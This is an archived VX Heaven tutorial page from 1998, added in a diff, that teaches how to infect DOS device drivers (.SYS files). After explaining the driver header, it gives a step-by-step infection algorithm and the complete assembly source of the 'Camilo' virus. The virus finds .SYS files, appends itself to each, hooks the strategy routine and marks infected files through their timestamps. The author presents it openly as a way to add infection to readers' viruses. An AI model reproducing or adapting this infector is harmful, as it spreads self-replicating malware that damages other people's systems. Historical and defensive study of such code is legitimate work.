@@ -1,0 +1,320 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Int13h 'Little SYS Infection Tutorial' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Int13h"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Int13h,Little SYS Infection Tutorial, stupid, push, word, pointer, device, routine, camilo, infected, header, offset, time, close, infection, field, byte"/>
+<meta name="Description" content="Well, here we will speak a bit about the infection of devices drivers, they are really very easy to infect. When finishing this reading you will be able to add infection of device drivers to your virus, then it will be more c00l :)"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"c34a188ef216b0a9c1edb373ae7597a54d246a4a-1498756703-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vin01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Little SYS Infection Tutorial</h1><p><a href="/lib/?lang=en&amp;author=Int13h"> Int13h</a><br/> <em>February 1998</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vin01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vin01">Back to index</a>] [<a href="/lib/vin01.html#disqus_thread">Comments</a>]<br/> 
+<p>Well, here we will speak a bit about the infection of devices drivers, they are really very easy to infect. When finishing this reading you will be able to add infection of device drivers to your virus, then it will be more c00l :) A .SYS phile, that is, a device driver, is a bridge of communication between the software and hardware devices. The SYS philes are read from the CONFIG.SYS, they are loaded in an own segment without PSP and are originated at offset 0. They can be block or character devices. The structure of a device driver follows:</p>
+<pre>
+	HEADER
+	STRATEGY ROUTINE
+	INTERRUPT ROUTINE
+</pre>
+<p>The first part of a .SYS program is the header, which structure is:</p>
+<table border="1" cellspacing="0" cellpadding="0" summary="SYS header">
+<tr><th>Offset</th><th>Length</th><th>Description</th></tr>
+<tr><td>0</td><td>4</td><td>32 bit pointer to next device driver header</td></tr>
+<tr><td>4</td><td>2</td><td>Attribute</td></tr>
+<tr><td>6</td><td>2</td><td>Pointer to strategy routine (offset)</td></tr>
+<tr><td>8</td><td>2</td><td>Pointer to interrupt routine (offset)</td></tr>
+<tr><td>A</td><td>8</td><td>Name of the device</td></tr>
+</table>
+<p>The first field is a 32 bit pointer to the device header of the next device, this is because in a .SYS file can be concatenated various devices, and the last in the chain has this relative offset of his header filled with the value FFFF:FFFF. The attribute word is used to identify if the driver is a character device or a block one. The next field, has the offset in the file where the strategy routine is, a strategy routine must save the location of the request header that DOS gives to it in ES:BX. The next field must hold the offset of the interrupt routine handler, which is the really working horse of the device driver, it must interpret the request header and perform the commands that it read from there. The last one, is a 8 bytes field that have the name of a character device or the number of units of a block device. DOS loads device drivers dynamically at boot time, reading them from the CONFIG.SYS, then a virus can take control before some antiviruses. You could read more about SYS structure in the chapter 9 of the Programmer's Technical Reference for MSDOS and the IBM PC, a very nice shareware document in TXT format.</p>
+<p>Just as an example, we will code a simple SYS file which displays a message. Here it is:</p>
+<pre class="source">
+8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8
+;
+; SIMPLE SYS FILE, by Int13h
+;
+; Compile:
+;       tasm /zi /m3 stupid.asm
+;       tlink /m /v stupid.obj
+;       tdstrip -c stupid.exe
+;       ren stupid.com stupid.sys
+;       Install stupid.sys with a DEVICE command in your CONFIG.SYS
+;
+.model tiny
+.code
+org 0
+
+Silly_SYS:                      ; SYS Header
+Next_Device dd 0ffffffffh       ; Just one device
+Attribute   dw 8000h            ; Type: character device
+Strategy    dw offset Strategy_Routine
+Interrupt   dw offset Interrupt_Routine
+NameDevice  db 'SillySYS'
+  
+
+Strategy_Routine:               ; Save ES:BX, address of the request header
+        mov word ptr cs:[Request_Header],bx
+        mov word ptr cs:[Request_Header+2],es
+        retf
+
+
+Interrupt_Routine:              ; The hearth of the program
+        push ds
+        push cs
+        pop ds                  ; DS=CS
+
+        ; Here, we points ES:BX to the request header
+        les bx,dword ptr ds:[Request_Header]
+        mov al,byte ptr es:[bx+2] ; Take the command byte
+        test al,al              ; Is 0? That means, initialization
+        jnz Go_Out              ; Nope
+
+        ; Here we set the segment and ending offset of the program
+        ; and with a 100h we indicate to DOS that all was sucessfull
+        mov word ptr es:[bx+03h],0100h
+        mov word ptr es:[bx+0eh],offset Ending
+        mov word ptr es:[bx+010h],cs
+
+        ; Display a stupid msg
+        mov cx,15
+        mov si,offset Message
+        lodsb
+        mov ah,0eh
+        xor bx,bx
+        int 10h
+        loop $-7
+
+        pop ds
+Go_Out: sub ax,ax
+        retf                    ; Return
+
+        Request_Header dw 0,0   ; This will hold the address passed by DOS
+        Message        db 'ABSURD WORLD!',13,10
+        Ending:
+
+End Silly_SYS
+
+8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8
+</pre>
+<p>Well. As you can see it is simple enough. Now, we will speak about the infection matter. A virus can add itself to the end of file and point the Next_Device field (offset 0) of the header to itself, then it will be acting like a normal program, this is the way that Dark Angel of Phalcom/Skim has choosed, and you can read about it in the number 9 of 40Hex magazine. For our infection purposes, we will hook the strategy routine. This is the routine that grabs the pointer to the request header (ES:BX) then you must be careful not changing these registers, specially with the garbage if you are making a polymorphic virus.</p>
+<p>Let's see:</p>
+<pre>
+	<strong>BEFORE INFECTION:</strong>
+                   &gt; Header (Points to Strategy Routine)
+                   &gt; Strategy Routine
+                   &gt; Interrupt Routine
+	<strong>AFTER INFECTION:</strong>
+                   &gt; Header (Points to Virus)
+                   &gt; Strategy Routine
+                   &gt; Interrupt Routine
+                   &gt; Virus
+</pre>
+<p>In others words, we will follow the next algorithm: </p>
+<ol>
+<li>Open the SYS file.</li>
+<li>Read the header (10 bytes).</li>
+<li>Save in a buffer the original pointer to strategy routine.</li>
+<li>Move pointer to end of file (save AX value).</li>
+<li>Write virus there.</li>
+<li>Modify header, changing the pointer to the strategy routine to the value in AX (file size), then it will point to virus.</li>
+<li>Move the pointer to the beginning.</li>
+<li>Write the modified header.</li>
+<li>Close the sucker.</li>
+</ol>
+<p>And that is all. For some comments I can be reached at <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="753c1b0144461d35141b011c061a161c14195b161a185b">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script> Here, as example, follows a runtime appending SYS infector which works by the method of reapoiting the strategy routine. Have fun!</p>
+<pre class="source">
+8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8
+; Camilo Virus by Int13h
+;
+; To assemble:
+;           tasm camilo.asm /m3
+;           tlink camilo
+;
+; Run  the program camilo.exe in a directory where there are some .SYS files.
+; Generally it will hang after the infection of all the  .SYS this is because
+; when it returns control to the original strategy it points to offset 0, but
+; the  infected  .SYS  will  run  without  any  problem.  Install  one of the
+; infected  device  drivers  in  your CONFIG.SYS as  DEVICE=infected.sys  and
+; all  will  be ok.  The virus is very simple and easy to understand, this is
+; a  tutorial,  remember? :)          Compile  under  TASM,  I  hate  A86! :)
+
+.model tiny
+.code
+jumps
+org 0
+
+VirusSize equ offset Heap-offset Camilo
+
+Camilo: db 0b8h                 ; mov ax,original strategy routine offset
+        Vieja_Estrategica dw 0  
+        push ax                 ; Push the address, then we will jump with a RET
+
+        push bx cx dx si di bp ds es
+
+        push cs cs
+        pop ds es               ; DS=CS
+
+        call Delta
+  Delta:pop di                  ; Get the delta offset
+        sub di,offset Delta
+
+        mov ah,02fh             ; Save original DTA
+        int 021h
+        mov word ptr [di+OriginalDTA],bx
+        mov word ptr [di+OriginalDTA+2],es
+
+        mov ah,01ah             ; Set an own DTA (points to heap)
+        lea dx,[di+offset ViralDTA]
+        int 021h
+
+        mov ah,04eh             ; Look for all the .SYS files in the
+        xor cx,cx               ; current directory
+        lea dx,[di+offset Victims]
+        int 021h
+        jc PopThem
+            
+Verify: mov ax,03d02h           ; Open the file found
+        lea dx,[di+offset ViralDTA+01eh]
+        int 021h
+        xchg bx,ax
+
+        mov ah,03fh             ; Read 10 bytes
+        lea dx,[di+offset Buffer]
+        mov cx,10d
+        int 021h
+
+        mov si,dx
+        mov ax,word ptr [si]
+        cmp ax,'ZM'             ; SYS with .EXE header?
+        je Close
+        inc ax                  ; Check if it header has the value 0xffff
+        jnz Close               ; to see if is the only device in the file
+
+        mov ax,05700h           ; Get date and time
+        int 021h
+        mov word ptr [di+Fecha],dx
+        mov word ptr [di+Hora],cx
+        and cl,00011111b
+        cmp cl,00011110b        ; 30*2= 60?  Look 4 infection mark
+        je Close
+
+        mov ax,04202h           ; Move pointer to EOF
+        sub cx,cx               
+        cwd
+        int 021h
+
+        mov cx,word ptr [si+6]  ; Store the original strategy routine
+        mov word ptr [di+Vieja_Estrategica],cx
+        ; Points strategy routine to virus code, at EOF (AX value)
+        mov word ptr [di+offset buffer+6],ax
+
+        mov ah,040h             ; Append virus to file
+        mov cx,VirusSize
+        lea dx,[di+offset Camilo]
+        int 021h
+
+        mov ax,04200h           ; Pointer to the beginning
+        xor cx,cx
+        cwd
+        int 021h
+
+        mov ah,040h             ; Write the modified header
+        mov cx,10
+        lea dx,[di+offset Buffer]
+        int 021h
+
+        mov ax,05701h           ; Restore date &amp; time
+        db 0bah
+        Fecha dw 0
+        db 0b9h
+        Hora dw 0
+        and cl,11100000b        ; Mark time as infected
+        or cl,00011110b         ; Set seconds=30*2=60!
+        int 021h
+
+Close:  mov ah,03eh             ; Close the sucker
+        int 021h
+
+        mov ah,04fh             ; Call the next victim
+        int 021h
+        jnc Verify
+
+PopThem:mov ah,01ah             ; Restore original DTA
+        lds dword ptr dx,[di+offset OriginalDTA]
+        int 021h
+
+        pop es ds bp di si dx cx bx
+
+        xor ax,ax
+        ret                     ; Jump to the original strategy routine!
+
+        Buffer    db 10 dup(0)  ; We will read the header here
+
+        ; Dedicated to Camilo Jose Cela, a genial novelist from Spain
+        VirusName db ' [CAMILO by Int13h] '
+
+        Victims   db '*.sys',0  ; Files to infect
+
+        HEAP label byte         ; End of virus in the file
+        OriginalDTA dd 0        ; Old DTA address
+        ViralDTA db 43 dup (0)  ; To use it in Find first/next functions
+
+End Camilo
+8&lt; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - &gt;8
+</pre>
+<pre>
+		INT13H Paraguay, February 13, 1998
+</pre>
+[<a style="" href="/lib/?lang=EN&amp;index=DO#vin01">Back to index</a>] [<a href="/lib/vin01.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vin01">de</a><a href="/lib/index.php?lang=en&amp;id=vin01">en</a><a href="/lib/index.php?lang=es&amp;id=vin01">es</a><a href="/lib/index.php?lang=it&amp;id=vin01">it</a><a href="/lib/index.php?lang=fr&amp;id=vin01">fr</a><a href="/lib/index.php?lang=pl&amp;id=vin01">pl</a><a href="/lib/index.php?lang=ru&amp;id=vin01">ru</a><a href="/lib/index.php?lang=ua&amp;id=vin01">ua</a></div>
+</body>
+</html>
